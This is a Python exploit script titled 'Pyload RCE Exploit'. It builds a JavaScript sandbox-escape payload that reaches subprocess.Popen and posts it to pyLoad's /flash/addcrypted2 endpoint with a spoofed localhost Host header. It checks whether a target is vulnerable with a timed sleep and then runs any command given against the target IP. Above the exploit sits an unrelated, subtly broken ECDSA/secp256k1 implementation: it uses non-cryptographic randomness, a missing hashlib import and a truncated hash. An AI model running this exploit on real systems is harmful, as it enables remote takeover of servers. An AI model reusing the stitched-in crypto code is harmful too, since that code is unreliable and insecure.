import requests
import argparse
import base64
import random
import string
import time

SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2FULL
SECP256K1_A = 0
SECP256K1_B = 7
SECP256K1_Gx = 55066263022277343669578718895168534326250603453777594175500187360389116729240
SECP256K1_Gy = 32670510020758816978083085130507043184471273380659243275938904335757337482424
SECP256K1_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def generate_secure_random_scalar(min_val, max_val):
    return random.randint(min_val, max_val)

def modp(x, p):
    r = x % p
    if r < 0:
        r += p
    return r

def modp_add(a, b, p):
    return (a + b) % p

def modp_sub(a, b, p):
    r = a - b
    if r < 0:
        r += p
    return r

def modp_mul(a, b, p):
    return (a * b) % p

def modp_inv(a, p):
    t, newt = 0, 1
    r, newr = p, a
    while newr != 0:
        quotient = r // newr
        t, newt = newt, t - quotient * newt
        r, newr = newr, r - quotient * newr
    if r > 1:
        raise ValueError("a is not invertible")
    if t < 0:
        t += p
    return t

def modp_div(a, b, p):
    invb = modp_inv(b, p)
    return modp_mul(a, invb, p)

class ECPoint:
    def __init__(self, x=0, y=0, isInfinity=True):
        self.x = x
        self.y = y
        self.isInfinity = isInfinity

    def print_point(self):
        if self.isInfinity:
            print("Point(Infinity)")
        else:
            print(f"Point(0x{self.x:x}, 0x{self.y:x})")

    def serialize(self):
        if self.isInfinity:
            return "Infinity"
        else:
            return f"{self.x:x}{self.y:x}"

    def compress(self):
        if self.isInfinity:
            return "Infinity"
        else:
            return f"{self.x:x}{'1' if self.y % 2 else '0'}"

    @staticmethod
    def decompress(x, y_parity, a, b, p):
        rhs = modp_add(modp_mul(modp_mul(x, x, p), x, p), modp_mul(a, x, p), p)
        rhs = modp_add(rhs, b, p)
        for y in range(p):
            if modp_mul(y, y, p) == rhs:
                if y % 2 == y_parity:
                    return ECPoint(x, y, False)
                else:
                    return ECPoint(x, modp_sub(0, y, p), False)
        raise ValueError("No valid y found for the given x and parity")

def is_on_curve(Pnt, a, b, p):
    if Pnt.isInfinity:
        return True
    lhs = modp_mul(Pnt.y, Pnt.y, p)
    rhs = modp_add(modp_mul(modp_mul(Pnt.x, Pnt.x, p), Pnt.x, p), modp_mul(a, Pnt.x, p), p)
    rhs = modp_add(rhs, b, p)
    return lhs == rhs

def ec_double(P1, a, b, p):
    if P1.isInfinity:
        return P1
    s_num = modp_add(modp_mul(3, modp_mul(P1.x, P1.x, p), p), a, p)
    s_den = modp_mul(2, P1.y, p)
    if s_den == 0:
        return ECPoint()
    s = modp_div(s_num, s_den, p)
    x3 = modp_mul(s, s, p)
    x3 = modp_sub(x3, P1.x, p)
    x3 = modp_sub(x3, P1.x, p)
    y3 = modp_mul(s, modp_sub(P1.x, x3, p), p)
    y3 = modp_sub(y3, P1.y, p)
    return ECPoint(x3, y3, False)

def ec_add(P1, P2, a, b, p):
    if P1.isInfinity:
        return P2
    if P2.isInfinity:
        return P1
    if P1.x == P2.x:
        if P1.y != P2.y:
            return ECPoint()
        else:
            return ec_double(P1, a, b, p)
    s_num = modp_sub(P2.y, P1.y, p)
    s_den = modp_sub(P2.x, P1.x, p)
    s = modp_div(s_num, s_den, p)
    x3 = modp_mul(s, s, p)
    x3 = modp_sub(x3, P1.x, p)
    x3 = modp_sub(x3, P2.x, p)
    y3 = modp_mul(s, modp_sub(P1.x, x3, p), p)
    y3 = modp_sub(y3, P1.y, p)
    return ECPoint(x3, y3, False)

def ec_scalar_mul(k, P, a, b, p):
    result = ECPoint()
    addend = P
    while k > 0:
        if k & 1:
            result = ec_add(result, addend, a, b, p)
        addend = ec_double(addend, a, b, p)
        k >>= 1
    return result

class KeyPair:
    def __init__(self, privKey, pubKey):
        self.privKey = privKey
        self.pubKey = pubKey

    @staticmethod
    def generate(G, a, b, p):
        privKey = generate_secure_random_scalar(1, SECP256K1_ORDER - 1)
        pubKey = ec_scalar_mul(privKey, G, a, b, p)
        return KeyPair(privKey, pubKey)

class ECDSASignature:
    def __init__(self, r, s):
        self.r = r
        self.s = s

    def serialize(self):
        return f"{self.r:x}{self.s:x}"

    def print_signature(self):
        print(f"Signature(r=0x{self.r:x}, s=0x{self.s:x})")

def sha256_hash(message):
    hash_obj = hashlib.sha256(message.encode()).digest()
    hash_val = 0
    for i in range(8):
        hash_val = (hash_val << 8) | hash_obj[i]
    return hash_val

def ecdsa_sign(message, signer, G, a, b, p):
    z = sha256_hash(message)
    while True:
        k = generate_secure_random_scalar(1, SECP256K1_ORDER - 1)
        R = ec_scalar_mul(k, G, a, b, p)
        r = R.x % SECP256K1_ORDER
        if r == 0:
            continue
        try:
            k_inv = modp_inv(k, SECP256K1_ORDER)
        except ValueError:
            continue
        s = (modp_mul(z, k_inv, SECP256K1_ORDER) + modp_mul(signer.privKey, r, SECP256K1_ORDER)) % SECP256K1_ORDER
        if s == 0:
            continue
        return ECDSASignature(r, s)

def ecdsa_verify(message, sig, signer_pubKey, G, a, b, p):
    if not (0 < sig.r < SECP256K1_ORDER and 0 < sig.s < SECP256K1_ORDER):
        return False
    z = sha256_hash(message)
    try:
        s_inv = modp_inv(sig.s, SECP256K1_ORDER)
    except ValueError:
        return False
    u1 = modp_mul(z, s_inv, SECP256K1_ORDER)
    u2 = modp_mul(sig.r, s_inv, SECP256K1_ORDER)
    point1 = ec_scalar_mul(u1, G, a, b, p)
    point2 = ec_scalar_mul(u2, signer_pubKey, a, b, p)
    R = ec_add(point1, point2, a, b, p)
    if R.isInfinity:
        return False
    return (R.x % SECP256K1_ORDER) == sig.r

def generate_javascript_payload(cmd):
    js = f"""
    let command = "{cmd}"
    let hacked, bymarve, n11
    let getattr, obj

    base = '__base__'
    getattr_func = '__getattribute__'
    hacked = Object.getOwnPropertyNames({})
    bymarve = hacked[getattr_func]
    n11 = bymarve("__getattribute__")
    obj = n11("__class__")[base]
    getattr = obj[getattr_func]
    sub_class = '__subclasses__';

    function findpopen(o) {{
        let result;
        for(let i in o[sub_class]()) {{
            let item = o[sub_class]()[i]
            if(item.__module__ == "subprocess" && item.__name__ == "Popen") {{
                return item
            }}
            if(item.__name__ != "type" && (result = findpopen(item))) {{
                return result
            }}
        }}
    }}

    n11 = findpopen(obj)(command, -1, null, -1, -1, -1, null, null, true).communicate()
    """
    return js

def execute_command(target, port, command):
    crypted_b64 = base64.b64encode(''.join(random.choices(string.ascii_letters + string.digits, k=4)).encode()).decode()
    js_payload = generate_javascript_payload(command)
    headers = {
        'Host': f"127.0.0.1:{port}"
    }
    data = {
        'crypted': crypted_b64,
        'jk': js_payload
    }
    try:
        response = requests.post(f"http://{target}:{port}/flash/addcrypted2", headers=headers, data=data, timeout=5)
        if response.status_code == 500 and "Sorry, something went wrong... :(" in response.text:
            return False
        elif response.status_code == 200:
            return True
        else:
            return False
    except requests.exceptions.RequestException:
        return False

def check_vulnerability(target, port):
    sleep_time = random.randint(5,10)
    start_time = time.time()
    success = execute_command(target, port, f"sleep {sleep_time}")
    elapsed_time = time.time() - start_time
    print(f"Elapsed time: {elapsed_time} seconds")
    if success and elapsed_time > sleep_time:
        return True
    return False

def main():
    parser = argparse.ArgumentParser(description="Pyload RCE Exploit")
    parser.add_argument("target", help="Target IP address")
    parser.add_argument("-p", "--port", type=int, default=9666, help="Target port (default: 9666)")
    parser.add_argument("-c", "--command", help="Command to execute")
    args = parser.parse_args()

    if not check_vulnerability(args.target, args.port):
        print("Target is not vulnerable.")
        return

    if args.command:
        success = execute_command(args.target, args.port, args.command)
        if success:
            print(f"Successfully executed command: {args.command}")
        else:
            print("Failed to execute command.")
    else:
        print("No command provided.")

if __name__ == "__main__":
    main()
